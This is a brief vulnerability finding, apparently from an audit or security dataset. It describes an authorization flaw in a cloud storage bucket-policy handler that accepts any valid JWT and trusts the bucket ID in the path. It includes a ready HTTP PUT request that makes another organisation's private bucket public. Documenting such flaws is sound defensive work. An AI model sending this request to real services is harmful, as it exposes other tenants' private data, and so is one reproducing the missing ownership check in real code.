diagnosis: The SetBucketPolicy Echo handler relies on JWT middleware for authentication, but updates the bucket access policy solely based on the bucketID path parameter. An authenticated user can alter the ACL/policy of other organizations' private cloud storage buckets, making sensitive data publicly accessible.
exploit_request:
PUT /storage/buckets/corp-prod-assets/policy HTTP/1.1
Host: storage.cloud-engine.io
Authorization: Bearer attacker_valid_jwt
Content-Type: application/json

{"is_public": true}
